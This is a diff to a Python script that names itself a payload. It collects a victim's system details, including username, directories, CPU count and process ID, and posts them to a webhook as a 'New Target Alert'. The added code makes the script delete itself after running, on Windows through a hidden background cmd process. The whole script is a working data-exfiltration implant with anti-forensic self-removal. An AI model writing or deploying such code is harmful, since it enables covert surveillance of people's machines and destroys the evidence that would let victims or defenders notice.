@@ -7,6 +7,8 @@ import argparse
 import requests
 import platform
 import getpass
+import subprocess
+import sys
 
 _working_path = pathlib.Path.cwd()
 _payload_path = pathlib.Path(__file__).resolve()
@@ -21,7 +23,6 @@ _cpu_count = os.cpu_count()
 _current_directory = os.getcwd()
 _home_directory = os.path.expanduser("~")
 _process_id = os.getpid()
-
 _webhook_lines = [
     "**-----**",
     "[!] **New Target Alert @everyone**",
@@ -46,3 +47,20 @@ try:
     response.raise_for_status()
 except requests.exceptions.RequestException as e:
     print(f"[!] Failed to send webhook: {e}")
+
+def _self_destruct():
+    script_path = str(_payload_path)
+    try:
+        if platform.system() == "Windows":
+            # Wait briefly and delete the file in a background cmd process
+            subprocess.Popen(
+                f'ping 127.0.0.1 -n 2 > nul & del /f /q "{script_path}"',
+                shell=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+        else:
+            os.remove(script_path)
+    except Exception as e:
+        print(f"[!] Failed to self-delete: {e}")
+
+_self_destruct()
